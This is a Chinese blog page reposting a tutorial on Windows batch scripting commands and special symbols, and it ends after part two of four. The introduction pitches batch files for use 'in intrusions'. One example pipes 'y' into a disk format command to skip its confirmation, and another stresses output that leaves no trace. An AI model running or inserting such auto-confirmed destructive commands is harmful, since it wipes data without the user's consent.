<!DOCTYPE html>
<html lang=zh>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="renderer" content="webkit">
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="format-detection" content="telephone=no,email=no,adress=no">
  <!-- Color theme for statusbar -->
  <meta name="theme-color" content="#000000" />
  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
  <meta http-equiv="window-target" content="_top" />
  
  
  <title>【K】批处理知识点 | MengZeATY</title>
  <meta name="description" content="批处理知识点">
<meta name="keywords" content="mengze,梦泽,批处理,编程,知识点,DOS,CMD">
<meta property="og:type" content="article">
<meta property="og:title" content="【K】批处理知识点">
<meta property="og:url" content="https://mengze.top/[K]批处理知识点/index.html">
<meta property="og:site_name" content="Meng Ze">
<meta property="og:description" content="批处理知识点">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2020-07-10T14:53:56.395Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="【K】批处理知识点">
<meta name="twitter:description" content="批处理知识点">
  <!-- Canonical links -->
  <link rel="canonical" href="https://mengze.top/[K]批处理知识点/index.html">
  
    <link rel="alternate" href="/atom.xml" title="Meng Ze" type="application/atom+xml">
  
  
    <link rel="icon" href="/images/MZ_White.png" type="image/x-icon">
  
  <link rel="stylesheet" href="/css/style.css">
  
  
  
    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
  
  
</head>


<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
  <div class="slimContent">
    <div class="navbar-header">
      
      
      <div class="profile-block text-center">
        <a id="avatar" href="https://mengze.top">
          <img class="img-circle img-rotate" src="/images/head.jpg" width="200" height="200">
        </a>
        <h2 id="name" class="hidden-xs hidden-sm">MengZeATY</h2>
        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Dream Founder &amp; Creator</h3>
        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Qingdao, China</small>
      </div>
      
      <div class="search" id="search-form-wrap">

    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="搜索" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
            </span>
        </div>
    </form>
    <div class="ins-search">
  <div class="ins-search-mask"></div>
  <div class="ins-search-container">
    <div class="ins-input-wrapper">
      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
    </div>
    <div class="ins-section-wrapper">
      <div class="ins-section-container"></div>
    </div>
  </div>
</div>


</div>
      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>
    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
      <ul class="nav navbar-nav main-nav ">
        
        
        <li class="menu-item menu-item-home">
          <a href="/">
            
            <i class="icon icon-home-fill"></i>
            
            <span class="menu-title">首页</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-emotion">
          <a href="/心情随笔/">
            
            <i class="icon icon-jiaju"></i>
            
            <span class="menu-title">随笔</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-essay">
          <a href="/手记编程设计/">
            
            <i class="icon icon-time"></i>
            
            <span class="menu-title">手记</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-repository">
          <a href="/repository">
            
            <i class="icon icon-project"></i>
            
            <span class="menu-title">项目</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-resume">
          <a href="/pages/resume/resume.html">
            
            <i class="icon icon-starfish"></i>
            
            <span class="menu-title">简历</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-links">
          <a href="/links">
            
            <i class="icon icon-friendship"></i>
            
            <span class="menu-title">友链</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-about">
          <a href="/about">
            
            <i class="icon icon-more"></i>
            
            <span class="menu-title">关于</span>
          </a>
        </li>
        
      </ul>
      
	
    <ul class="social-links">
    	
        <li><a href="https://github.com/AaronTYin" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
        
        <li><a href="https://weibo.com/6148427895" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
        
        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
        
    </ul>

    </nav>
  </div>
</header>

  
    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    
      <div class="widget">
    <h3 class="widget-title">公告</h3>
    <div class="widget-body">
        <div id="board">
            <div class="content">
                <b>网站正在全面改版中，最新动态请关注微博或BiliBili：MengZeATY，感谢大家的支持和等待，mengze.top即将开启新的征程，希望届时还能为大家带来更加完善的精彩。</b>
            </div>
        </div>
    </div>
</div>

    
      

    
      
  <div class="widget">
    <h3 class="widget-title">标签</h3>
    <div class="widget-body">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/English/">English</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/后期设计/">后期设计</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小说随笔/">小说随笔</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/嵌入式/">嵌入式</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/手记/">手记</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文学/">文学</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/生物医学/">生物医学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/电子硬件/">电子硬件</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程/">编程</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/自然科学/">自然科学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/通信/">通信</a><span class="tag-list-count">2</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">标签云</h3>
    <div class="widget-body tagcloud">
      <a href="/tags/English/" style="font-size: 13.57px;">English</a> <a href="/tags/前端/" style="font-size: 13.29px;">前端</a> <a href="/tags/后期设计/" style="font-size: 13px;">后期设计</a> <a href="/tags/小说随笔/" style="font-size: 13px;">小说随笔</a> <a href="/tags/嵌入式/" style="font-size: 13.14px;">嵌入式</a> <a href="/tags/手记/" style="font-size: 13.43px;">手记</a> <a href="/tags/文学/" style="font-size: 13.86px;">文学</a> <a href="/tags/生物医学/" style="font-size: 13px;">生物医学</a> <a href="/tags/电子硬件/" style="font-size: 14px;">电子硬件</a> <a href="/tags/编程/" style="font-size: 13.71px;">编程</a> <a href="/tags/自然科学/" style="font-size: 13px;">自然科学</a> <a href="/tags/通信/" style="font-size: 13px;">通信</a>
    </div>
  </div>

    
      
  <div class="widget">
    <h3 class="widget-title">归档</h3>
    <div class="widget-body">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/">2026</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">49</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/">2010</a><span class="archive-list-count">1</span></li></ul>
    </div>
  </div>


    
  </div>
</aside>

  
  
<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <nav id="toc" class="article-toc">
      <h3 class="toc-title">文章目录</h3>
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一部分：批处理的专用命令"><span class="toc-number">1.</span> <span class="toc-text">第一部分：批处理的专用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、REM"><span class="toc-number">1.1.</span> <span class="toc-text">1、REM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、ECHO"><span class="toc-number">1.2.</span> <span class="toc-text">2、ECHO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、GOTO"><span class="toc-number">1.3.</span> <span class="toc-text">3、GOTO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、CALL"><span class="toc-number">1.4.</span> <span class="toc-text">4、CALL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5、PAUSE"><span class="toc-number">1.5.</span> <span class="toc-text">5、PAUSE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6、IF"><span class="toc-number">1.6.</span> <span class="toc-text">6、IF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7、FOR"><span class="toc-number">1.7.</span> <span class="toc-text">7、FOR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8、SETLOCAL"><span class="toc-number">1.8.</span> <span class="toc-text">8、SETLOCAL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9、SHIFT"><span class="toc-number">1.9.</span> <span class="toc-text">9、SHIFT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二部分：特殊的符号与批处理"><span class="toc-number">2.</span> <span class="toc-text">第二部分：特殊的符号与批处理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、-符号"><span class="toc-number">2.1.</span> <span class="toc-text">1、 符号(@)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、-符号-gt"><span class="toc-number">2.2.</span> <span class="toc-text">2、 符号(>)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、-符号-gt-gt"><span class="toc-number">2.3.</span> <span class="toc-text">3、 符号(>>)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、-符号"><span class="toc-number">2.4.</span> <span class="toc-text">4、 符号(|)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5、-符号"><span class="toc-number">2.5.</span> <span class="toc-text">5、 符号(^)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6、-符号-amp"><span class="toc-number">2.6.</span> <span class="toc-text">6、 符号(&)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7、-符号-amp-amp"><span class="toc-number">2.7.</span> <span class="toc-text">7、 符号(&&)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8、-符号-“-“"><span class="toc-number">2.8.</span> <span class="toc-text">8、 符号(“ “)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9、-符号（-）"><span class="toc-number">2.9.</span> <span class="toc-text">9、 符号（,）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10、-符号"><span class="toc-number">2.10.</span> <span class="toc-text">10、 符号(;)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三部分：批处理与变量"><span class="toc-number">3.</span> <span class="toc-text">第三部分：批处理与变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四部分：完整案例"><span class="toc-number">4.</span> <span class="toc-text">第四部分：完整案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#例一"><span class="toc-number">4.1.</span> <span class="toc-text">例一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例二"><span class="toc-number">4.2.</span> <span class="toc-text">例二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例三"><span class="toc-number">4.3.</span> <span class="toc-text">例三</span></a></li></ol></li></ol>
    </nav>
  </div>
</aside>

<main class="main" role="main">
  <div class="content">
  <article id="post-[K]批处理知识点" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      
        
  
    <h1 class="article-title" itemprop="name">
      【K】批处理知识点
    </h1>
  

      
      <div class="article-meta">
        <span class="article-date">
    <i class="icon icon-calendar-check"></i>
	<a href="/[K]批处理知识点/" class="article-date">
	  <time datetime="2018-03-18T16:00:00.000Z" itemprop="datePublished">2018-03-19</time>
	</a>
</span>
        
        
  <span class="article-tag">
    <i class="icon icon-tags"></i>
	<a class="article-tag-link" href="/tags/编程/">编程</a>
  </span>


        
	<span class="article-read hidden-xs">
	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
	    <span id="busuanzi_container_page_pv">
			<span id="busuanzi_value_page_pv">0</span>
		</span>
	</span>


        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/[K]批处理知识点/#comments" class="article-comment-link">评论</a></span>
        
	
		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 6.7k(字)</span>
	
	
		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 26(分)</span>
	

      </div>
    </div>
    <div class="article-entry marked-body" itemprop="articleBody">
      
        <hr>
<a id="more"></a>
<blockquote>
<p>　　本文摘录自 <a href="http://blog.51cto.com/hyzjut/10020" target="_blank" rel="external">红衣主教–51CTO博客</a>,若侵删。</p>
<p>另附<a href="https://mengze.top/sourcefile/系统小工具集.bat">系统小工具集.bat</a></p>
</blockquote>
<p>　　在入侵中，大家有过编一个简单的程序来实现你的目的，BAT应该是大家常用的吧。如果你还没学会，那就快看下面的吧，我相信它会对你有意而无害的。</p>
<h2 id="第一部分：批处理的专用命令"><a href="#第一部分：批处理的专用命令" class="headerlink" title="第一部分：批处理的专用命令"></a><strong>第一部分：批处理的专用命令</strong></h2><p>　　批处理文件是将一系列命令按一定的顺序集合为一个可执行的文本文件，其扩展名为BAT。这些命令统称批处理命令，下面我就来给大家介绍一下批处理的命令。</p>
<h3 id="1、REM"><a href="#1、REM" class="headerlink" title="1、REM"></a>1、REM</h3><p>　　REM 是个注释命令一般是用来给程序加上注解的，该命令后的内容在程序执行的时候将不会被显示和执行。</p>
<p>例：REM 你现在看到的就是注解，这一句将不会被执行。在以后的例子中解释的内容都REM 会放在REM后面。请大家注意。</p>
<h3 id="2、ECHO"><a href="#2、ECHO" class="headerlink" title="2、ECHO"></a>2、ECHO</h3><p>　　ECHO 是一个回显命令主要参数有OFF和 ON,一般用ECHO message来显示一个特定的消息。</p>
<p>例：Echo off<br>Rem 以上代表关闭回显即不显示所执行的命令<br>Echo 这个就是消息。<br>Rem 以上代表显示“这就是消息”这列字符</p>
<p>执行结果：<br>C:>ECHO.BAT<br>这个就是消息。</p>
<h3 id="3、GOTO"><a href="#3、GOTO" class="headerlink" title="3、GOTO"></a>3、GOTO</h3><p>　　GOTO 即为跳转的意思。在批处理中允许以“：XXX”来构建一个标号然后用GOTO ：标号直接来执行标号后的命令。</p>
<p>例:LABEL<br>REM 上面就是名为LABEL的标号。<br>DIR C:\<br>DIR D:\<br>GOTO LABEL<br>REM 以上程序跳转标号LABEL处继续执行。</p>
<h3 id="4、CALL"><a href="#4、CALL" class="headerlink" title="4、CALL"></a>4、CALL</h3><p>　　CALL 命令可以在批处理执行过程中调用另一个批处理，当另一个批处理执行完后再继续执行原来的批处理。</p>
<p>例：批处理2.BAT内容如下：<br>ECHO 这就是2的内容<br>批处理1.BAT内容如下：<br>ECHO 这是1的内容<br>CALL 2.BAT<br>ECHO 1和2的内容全部显示完成</p>
<p>执行结果如下：<br>C:>1.BAT<br>这是1的内容<br>这就是2的内容<br>1和2的内容全部显示完成</p>
<h3 id="5、PAUSE"><a href="#5、PAUSE" class="headerlink" title="5、PAUSE"></a>5、PAUSE</h3><p>PAUSE 停止系统命令的执行并显示下面的内容。</p>
<p>例：C:> PAUSE<br>请按任意键继续 . . .</p>
<h3 id="6、IF"><a href="#6、IF" class="headerlink" title="6、IF"></a>6、IF</h3><p>IF 条件判断语句，语法格式如下：<br>IF [NOT] ERRORLEVEL number command<br>IF [NOT] string1==string2 command<br>IF [NOT] EXIST filename command</p>
<p>说明：<br>[NOT] 将返回的结果取反值即“如果没有”的意思。</p>
<p>ERRORLEVEL 是命令执行完成后返回的退出值</p>
<p>Number 退出值的数字取值范围0~255。判断时值的排列顺序应该又大到小。返回的值大于或等于指定的值时条件成立。</p>
<p>string1==string2 string1和string2都为字符的数据，英文字符的大小写将看做不同，这个条件中的等于号必须是2个（绝对相等），条件想等后即执行后面的 command</p>
<p>EXIST filename 为文件或目录存在的意思。</p>
<p>IF ERRORLEVEL这条语句必须放在某一个命令后面。执行命令后由IF ERRORLEVEL来判断命令的返回值。</p>
<p>例：<br>1、IF [NOT] ERRORLEVEL number command<br>检测命令执行完后的返回值做出判断。<br>echo off<br>dir z:<br>rem 如果退出代码为1（不成功）就跳至标题1处执行<br>IF ERRORLEVEL 1 goto 1<br>rem 如果退出代码为0（成功）就跳至标题0处执行<br>IF ERRORLEVEL 0 goto 0<br>:0<br>echo 命令执行成功！<br>Rem 程序执行完毕跳至标题exit处退出<br>goto exit<br>:1<br>echo 命令执行失败！<br>Rem 程序执行完毕跳至标题exit处退出<br>goto exit<br>:exit<br>Rem 这里是程序的出口</p>
<p>2、IF string1==string2 command<br>检测当前变量的值做出判断<br>ECHO OFF<br>IF %1==2 goto no<br>Echo 变量相等！<br>Goto exit<br>:no<br>echo 变量不相等<br>goto exit<br>:exit<br>大家可以这样看效果 C:>test.bat 数字</p>
<p>3、IF [NOT] EXIST filename command<br>发现特定的文件做出判断<br>echo off<br>IF not EXIST autoexec.bat goto 1<br>echo 文件存在成功！<br>goto exit<br>:1<br>echo 文件不存在失败！<br>goto exit<br>:exit<br>这个批处理大家可以放在c盘和d盘分别执行看看效果。</p>
<h3 id="7、FOR"><a href="#7、FOR" class="headerlink" title="7、FOR"></a>7、FOR</h3><p>　　FOR这个命令比较特殊是一个循环执行命令的命令，同时FOR的循环里面还可以套用FOR在进行循环。这篇我们介绍基本的用法就不做套用的循环了，后面再来讲解套用的循环。</p>
<p>在批处理中FOR的命令如下：<br>FOR [%%c] IN (set) DO [command] [arguments]<br>在命令行中命令如下：<br>FOR [%c] IN (set) DO [command] [arguments]</p>
<p>常用参数：<br>/L 该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生序列 (5 4 3 2 1)。</p>
<p>/D 如果集中包含通配符，则指定与目录名匹配，而不与文件名匹配。</p>
<p>/F 从指定的文件中读取数据作为变量</p>
<p>eol=c - 指一个行注释字符的结尾(就一个)</p>
<p>skip=n - 指在文件开始时忽略的行数。</p>
<p>delims=xxx - 指分隔符集。这个替换了空格和跳格键的默认分隔符集。</p>
<p>tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代的 for 本身。这会导致额外变量名称的分配。m-n格式为一个范围。通过 nth 符号指定 mth。如果符号字符串中的最后一个字符星号，那么额外的变量将在最后一个符号解析之后分配并接受行的保留文本。</p>
<p>usebackq - 指定新语法已在下类情况中使用:在作为命令执行一个后引号的字符串并且一个单引号字符为文字字符串命令并允许在 filenameset中使用双引号扩起文件名称。</p>
<p>下面来看一个例子：<br>FOR /F “eol=; tokens=2,3* delims=, “ %i in (myfile.txt) do @echo %i %j %k 会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将每行中的第二个和第三个符号传递给 for 程序体；用逗号和/或空格定界符号。请注意，这个 for 程序体的语句引用 %i 来取得第二个符号，引用 %j 来取得第三个符号，引用 %k来取得第三个符号后的所有剩余符号。对于带有空格的文件名，您需要用双引号将文件名括起来。为了用这种方式来使用双引号，您还需要使用 usebackq 选项，否则，双引号会被理解成是用作定义某个要分析的字符串的。</p>
<p>%i 专门在 for 语句中得到说明，%j 和 %k 是通过tokens= 选项专门得到说明的。您可以通过 tokens= 一行指定最多 26 个符号，只要不试图说明一个高于字母 ‘z’ 或’Z’ 的变量。请记住，FOR 变量名分大小写，是通用的；而且，同时不能有 52 个以上都在使用中。</p>
<p>您还可以在相邻字符串上使用 FOR /F 分析逻辑；方法是，用单引号将括号之间的filenameset括起来。这样，该字符串会被当作一个文件中的一个单一输入行。最后，您可以用FOR /F命令来分析命令的输出。方法是，将括号之间的filenameset变成一个反括字符串。该字符串会被当作命令行，传递到一个子 CMD.EXE，其输出会被抓进内存，并被当作文件分析。</p>
<p>因此，以下例子:<br>FOR /F “usebackq delims==” %i IN (<code>set</code>) DO @echo %i 会枚举当前环境中的环境变量名称。</p>
<p>以下列举一个简单的例子，他将说明参数/L和没有参数的区别：<br>删除文件1.TXT 2.TXT 3.TXT 4.TXT 5.TXT</p>
<p>例：<br>ECHO OFF<br>FOR /L %%F IN (1,1,5) DO DEL %%F.TXT<br>或<br>FOR %%F IN (1,2,3,4,5) DO DEL %%F.TXT<br>以上2条命令执行的结果都是一样的如下：<br>C:>DEL 1.TXT<br>C:>DEL 2.TXT<br>C:>DEL 3.TXT<br>C:>DEL 4.TXT<br>C:>DEL 5.TXT</p>
<h3 id="8、SETLOCAL"><a href="#8、SETLOCAL" class="headerlink" title="8、SETLOCAL"></a>8、SETLOCAL</h3><p>　　开始批处理文件中环境改动的本地化操作。在执行SETLOCAL之后所做的环境改动只限于批处理文件。要还原原先的设置，必须执行ENDLOCAL。达到批处理文件结尾时，对于该批处理文件的每个尚未执行的SETLOCAL命令，都会有一个隐含的ENDLOCAL被执行。</p>
<p>例：@ECHO OFF<br>SET PATH /<em>察看环境变量PATH<br>PAUSE<br>SETLOCAL<br>SET PATH=E:\TOOLS /</em>重新设置环境变量PATH<br>SET PATH<br>PAUSE<br>ENDLOCAL<br>SET PATH</p>
<p>　　从上例我们可以看到环境变量PATH第1次被显示得时候是系统默认路径。被设置成了E:\TOOLS后显示为E:\TOOLS但当ENDLOCAL后我们可以看到他又被还原成了系统的默认路径。但这个设置只在该批处理运行的时候有作用。当批处理运行完成后环境变量PATH将会还原。</p>
<h3 id="9、SHIFT"><a href="#9、SHIFT" class="headerlink" title="9、SHIFT"></a>9、SHIFT</h3><p>　　SHIFT命令可以让在命令上的的命令使用超过10个（%0~%9）以上的可替代参数</p>
<p>例：ECHO OFF<br>ECHO %1 %2 %3 %4 %5 %6 %7 %8 %9<br>SHIFT<br>ECHO %1 %2 %3 %4 %5 %6 %7 %8 %9<br>SHIFT<br>ECHO %1 %2 %3 %4 %5 %6 %7 %8 %9</p>
<p>执行结果如下：<br>C::>SHIFT.BAT 1 2 3 4 5 6 7 8 9 10 11<br>1 2 3 4 5 6 7 8 9<br>2 3 4 5 6 7 8 9 10<br>3 4 5 6 7 8 9 10 11</p>
<p>以上就是基于WIN2000下的9个批处理命令。</p>
<h2 id="第二部分：特殊的符号与批处理"><a href="#第二部分：特殊的符号与批处理" class="headerlink" title="第二部分：特殊的符号与批处理"></a><strong>第二部分：特殊的符号与批处理</strong></h2><p>在命令行下有些符号是不允许使用的但有些符号却有着特殊的意义。</p>
<h3 id="1、-符号"><a href="#1、-符号" class="headerlink" title="1、 符号(@)"></a>1、 符号(@)</h3><p>@在批处理中的意思是关闭当前行的回显。我们从上面知道用命令echo off可以关掉整个批处理的命令回显但却不能不显示echo off这个命令。现在我们在这个命令前加上@这样echo off这一命令就被@关闭了回显从而达到所有命令均不回显得要求</p>
<h3 id="2、-符号-gt"><a href="#2、-符号-gt" class="headerlink" title="2、 符号(&gt;)"></a>2、 符号(&gt;)</h3><p>>的意思是传递并覆盖。他所起的作用是将运行后的回显结果传递到后面的范围（后面可是文件也可是默认的系统控制台）</p>
<p>例：<br>文件1.txt的文件内容为：<br>1+1<br>使用命令c:>dir *.txt &gt;1.txt<br>这时候1.txt的内容如下<br>驱动器 C 中的卷没有标签。<br>卷的序列号是 301A-1508<br>C:\ 的目录<br>2003-03-11 14:04 1,005 FRUNLOG.TXT<br>2003-04-04 16:38 18,598,494 log.txt<br>2003-04-04 17:02 5 1.txt<br>2003-03-12 11:43 0 aierrorlog.txt<br>2003-03-30 00:35 30,571 202.108.txt<br>5 个文件 18,630,070 字节<br>0 个目录 1,191,542,784 可用字节</p>
<p>将命令执行的结果覆盖了原始的文件内容。<br>在传递给控制台的时候程序将不会有任何回显（注意：这里的回显跟echo off关掉的回显不是同一概念。Echo off关掉的是输入命令的回显，这里的回显是程序执行中或后的回显）</p>
<p>例：C:>dir *.txt &gt;nul<br>程序将没有任何显示也不会产生任何痕迹。</p>
<h3 id="3、-符号-gt-gt"><a href="#3、-符号-gt-gt" class="headerlink" title="3、 符号(&gt;&gt;)"></a>3、 符号(&gt;&gt;)</h3><p>符号&gt;&gt;的作用与符号&gt;相似，但他们的区别在于&gt;&gt;是传递并在文件末尾追加&gt;&gt;也可将回显传递给控制台（用法同上）</p>
<p>例：<br>文件1.txt内同为：<br>1+1<br>使用命令c:>dir *.txt &gt;&gt;1.txt<br>这时候1.txt的内容如下<br>1+1<br>驱动器 C 中的卷没有标签。<br>卷的序列号是 301A-1508<br>C:\ 的目录<br>2003-03-11 14:04 1,005 FRUNLOG.TXT<br>2003-04-04 16:38 18,598,494 log.txt<br>2003-04-04 17:02 5 1.txt<br>2003-03-12 11:43 0 aierrorlog.txt<br>2003-03-30 00:35 30,571 202.108.txt<br>5 个文件 18,630,070 字节<br>0 个目录 1,191,542,784 可用字节<br>>&gt;将命令执行的结果覆加在了原始的文件内容后面。</p>
<h3 id="4、-符号"><a href="#4、-符号" class="headerlink" title="4、 符号(|)"></a>4、 符号(|)</h3><p>|是一个管道传输命令意思是将上一命令执行的结果传递给下一命令去处理。</p>
<p>例：<br>C:>dir c:|find “1508”<br>卷的序列号是 301A-1508<br>以上命令的意思为查找c:\的所有并发现1508字符串。<br>Find的用法请用 find /?自行查看</p>
<p>在不使用format的自动格式化参数的时候我是这样来自动格式化盘片的<br>echo y|fornat a: /s /q /v:system<br>用过format命令的人都知道format有一个交互对化过程，要使用者输入y来确定当前的命令是否被执行。在这个命令前加上echo y并用管道传输符|将echo执行的结果y传递给format从而达到手工输入y的目的（这条命令有危害性，测试的时候请谨慎）</p>
<h3 id="5、-符号"><a href="#5、-符号" class="headerlink" title="5、 符号(^)"></a>5、 符号(^)</h3><p>^ 是对特殊符号 &gt; 、&lt;、 &amp;、的前导字符。在命令中他将以上的3个符号的特殊动能去掉仅仅只吧他们当成符号而不使用他们的特殊意义。</p>
<p>例：<br>c:>echo test ^&gt; 1.txt<br>test &gt; 1.txt<br>从上面可以看出并没有把test写入文件1.txt而是将test &gt;1.txt 当字符串显示了出来。这个符号在远程构建批处理的时候很有效果。</p>
<h3 id="6、-符号-amp"><a href="#6、-符号-amp" class="headerlink" title="6、 符号(&amp;)"></a>6、 符号(&amp;)</h3><p>&amp;符号允许在一行中使用2个以上不同的命令，当第一个命令执行失败将不影响第2个命令的执行。</p>
<p>例：<br>c:> dir z:\ &amp;dir y:\ &amp;dir c:\<br>以上的命令将会连续显示z: y: c:盘内的内容不理会该盘符是否存在。</p>
<h3 id="7、-符号-amp-amp"><a href="#7、-符号-amp-amp" class="headerlink" title="7、 符号(&amp;&amp;)"></a>7、 符号(&amp;&amp;)</h3><p>&amp;&amp;符号也是允许在一行中使用2个以上不同的命令，当第一个命令执行失败后后续的命令将不会再被执行。</p>
<p>例：<br>c:> dir z:\ &amp;&amp;dir y:\ &amp;&amp;dir c:\<br>以上的命令将会提示检查是否存在z:盘如果存在则执行，如果不存在则停止执行所有的后续命令</p>
<h3 id="8、-符号-“-“"><a href="#8、-符号-“-“" class="headerlink" title="8、 符号(“ “)"></a>8、 符号(“ “)</h3><p>“ “符号允许在字符串中包含空格。进入一个特殊的目录可以用如下方法</p>
<p>例:<br>c:>cd “Program Files”<br>c:>cd progra~1<br>c:>cd pro*<br>以上方法都可以进入Program Files目录</p>
<h3 id="9、-符号（-）"><a href="#9、-符号（-）" class="headerlink" title="9、 符号（,）"></a>9、 符号（,）</h3><p>,符号相当于空格。在某些特殊的情况下可以用,来代替空格使用。</p>
<p>例：<br>c:>dir,c:\</p>
<h3 id="10、-符号"><a href="#10、-符号" class="headerlink" title="10、 符号(;)"></a>10、 符号(;)</h3><p>;符号当命令相同的时候可以将不同的目标用;隔离开来但执行效果不变。如执行过程中发生错误则只返回错误报告但程序还是会继续执行。</p>
<p>例：<br>DIR C:\;D:\;E:\F:\<br>以上的命令相当于<br>DIR C:\<br>DIR D:\<br>DIR E:\<br>DIR F:\</p>
<p>当然还有些特殊的符号但他们的使用范围很小我就不再这里一一的说明了。</p>
